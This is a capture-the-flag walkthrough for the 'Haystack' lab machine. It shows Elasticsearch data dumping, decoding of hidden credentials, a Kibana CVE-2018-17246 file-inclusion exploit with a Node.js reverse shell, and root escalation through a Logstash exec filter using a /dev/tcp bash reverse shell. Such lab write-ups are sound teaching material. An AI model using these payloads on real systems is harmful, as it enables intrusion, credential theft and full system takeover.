# Haystack

Info
* OS: Linux
* Difficulty: easy
* IP: `10.10.10.115`

Tags
* elasticsearch
* kibana

<!--

Required tools
* nmap

Other commands/tools
```
TODO
```

-->

## Walkthrough

* [IppSec](https://www.youtube.com/watch?v=oGO9MEIz_tI) (video)

### Enumeration

Nmap
```bash
nmap -sC -sV -oA nmap.out 10.10.10.115

# output
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.12.2
9200/tcp open  http    nginx 1.12.2
| http-methods: 
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
```

Nmap script
```bash
git clone --depth 1 https://github.com/theMiddleBlue/nmap-elasticsearch-nse.git /opt/nmap-elasticsearch-nse

ln -s /opt/nmap-elasticsearch-nse/elasticsearch.nse /usr/share/nmap/scripts/

# enumeration
nmap -p9200 --script=elasticsearch 10.10.10.115

# output
PORT     STATE SERVICE
9200/tcp open  wap-wsp
| elasticsearch: by theMiddle (Twitter: @AndreaTheMiddle)
| 
| found RESTful API
| version: 6.4.2
| cluster name: elasticsearch
| 
| Indices found in /_cat/indices:
| health index   docs.count
| green  .kibana          1
| yellow quotes         253
| yellow bank          1000
| 
| Plugins found in /_cat/plugins:
| 
| Nodes found in /_cat/nodes:
| 127.0.0.1 8 69 3 0.00 0.04 0.05 mdi * iQEYHgS
| 
| Nodes process:
|  - Name: iQEYHgS
|  - Transport Address: 127.0.0.1:9300
|  - Host: 127.0.0.1
|  - IP: 127.0.0.1
|  - Version: 6.4.2
|_
```

Explore Elasticsearch data

* [HackTricks](https://book.hacktricks.xyz/pentesting/9200-pentesting-elasticsearch)
* [Elasticsearch REST APIs](https://www.elastic.co/guide/en/elasticsearch/reference/current/rest-apis.html)

```bash
# version 6.4.2
http 10.10.10.115:9200

# not json
http 10.10.10.115:9200/_cat
# e.g. list indexes
http 10.10.10.115:9200/_cat/indices?v
http 10.10.10.115:9200/_cat/indices?help

# dump data limit 10
http 10.10.10.115:9200/bank/_search?pretty=true
# search on an index
http 10.10.10.115:9200/_search?pretty=true\&q=Rockwell

# dump data
http -b 10.10.10.115:9200/bank/_search?size=1000 | jq '.hits.hits[]._source.email' | tee bank-emails.txt
http -b 10.10.10.115:9200/quotes/_search?size=253 | jq '.hits.hits[]._source.quote' | tee quotes.txt
wc -l bank-emails.txt
```

Translate data

* [googletrans](https://pypi.org/project/googletrans)

```bash
# install dependencies
pip install requests googletrans==3.1.0a0

# run script
python exploit.py

# extract data
cat quotes-translated.txt | jq '.[]' | grep -i key
```

Script `exploit.py`
```python
#!/bin/python3
import requests, json
from googletrans import Translator

r = requests.get('http://10.10.10.115:9200/quotes/_search?size=253')
quotes = json.loads(r.text)
translator = Translator()

results = []
for quote in quotes['hits']['hits']:
    q = quote['_source']['quote']
    qt = (translator.translate(q, src='es', dest='en')).text
    print(qt)
    print()
    results.append(qt)

with open('quotes-translated.txt', 'w') as filehandle:
    json.dump(results, filehandle)
```

Analyze data
```bash
# "This key cannot be lost, I keep it here: ???"
"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
# "pass: spanish.is.key"
echo "cGFzczogc3BhbmlzaC5pcy5rZXk=" | base64 -d

# "I have to save the key for the machine: ???"
"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg"
# "user: security"
echo "dXNlcjogc2VjdXJpdHkg" | base64 -d

# spanish.is.key
ssh -o StrictHostKeyChecking=no security@10.10.10.115

# flag
cat /home/security/user.txt
```

### Lateral Movement

Upload privesc scripts
```bash
mkdir -p /share/www

curl -sS -L -o /share/www/linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# run static server
python3 -m http.server -d /share/www

# tun0 <IP_ADDRESS> of attacker
curl -o /dev/shm/linpeas.sh 10.10.14.14:8000/linpeas.sh
bash /dev/shm/linpeas.sh -a > /dev/shm/linpeas.txt

less -r /dev/shm/linpeas.txt

# it's running as ROOT: look for code execution
/usr/share/logstash
```

Kibana vulnerability

* [Local File Inclusion](https://github.com/mpgn/CVE-2018-17246)

```bash
# listening ipv4 ports
ss -4 -l -n

# port forward to attacker machine
ssh -N -L 5602:127.0.0.1:5601 security@10.10.10.115

# kibana version "6.4.2"
curl -sS http://127.0.0.1:5602/api/status | jq '.version.number'
```

Sample payload
```bash
echo 'console.log("Hello World");' > /tmp/hello.js
echo '(function(){console.log("Hello World");})();' > /tmp/hello.js
echo '(function(){require("fs").writeFile("/tmp/hello.txt", "Hello World");return /a/;})();' > /tmp/hello.js
# manual test
/usr/share/kibana/node/bin/node /tmp/hello.js

# kibana log
tail -f /var/log/kibana/kibana.stdout

# from inside
curl 'http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../../tmp/hello.js'

# from outside
http "http://127.0.0.1:5602/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../../tmp/hello.js"
```

Reverse shell
```bash
# vim /tmp/shell.js
(function(){
  var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);
  var client = new net.Socket();
  client.connect(4242, "10.10.14.14", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  return /a/; // Prevents the Node.js application from crashing
})();

# NOTE you can invoke curl only once: change the name of the file to re-run the same script
# e.g. mv /tmp/shell.js /tmp/shell1.js

# listen
nc -lvnp 4242

# run payload
curl 'http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../../tmp/shell.js'
```

Upgrade shell
```bash
# in reverse-shell
python -c 'import pty; pty.spawn("/bin/bash")'

# background
CTRL+Z

# in attacker machine
stty raw -echo

# not typed
fg
ENTER
ENTER

# in reverse-shell
export TERM=xterm
```

### Privilege Escalation

Abuse Logstash running with root permissions

* [Grok filter plugin](https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html)

```bash
# enumerate files owned by "kibana" excluding "usr" and "proc" folder
find / -user kibana 2>/dev/null | grep -v usr | grep -v proc
find / -group kibana 2>/dev/null | grep -v usr | grep -v proc

# code execution abusing files with root user and kibana group 
/etc/logstash/conf.d/input.conf
/etc/logstash/conf.d/output.conf
/etc/logstash/conf.d/filter.conf

cat /etc/logstash/conf.d/filter.conf 
filter {
  if [type] == "execute" {
    grok {
      match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
    }
  }
}
cat /etc/logstash/conf.d/input.conf  
input {
  file {
    path => "/opt/kibana/logstash_*"
    start_position => "beginning"
    sincedb_path => "/dev/null"
    stat_interval => "10 second"
    type => "execute"
    mode => "read"
  }
}
cat /etc/logstash/conf.d/output.conf 
output {
  if [type] == "execute" {
    stdout { codec => json }
    exec {
      command => "%{comando} &"
    }
  }
}
```

Reverse shell to gain root access
```bash
echo "Ejecutar comando : touch /dev/shm/kibana.txt" > /opt/kibana/logstash_hello
# verify
watch -n 1 ls -la /dev/shm
# default 2 seconds
watch date

nc -lvnp 4242
# \s is space
echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.14/4242 0>&1" > /opt/kibana/logstash_shell

# flag
cat /root/root.txt
```
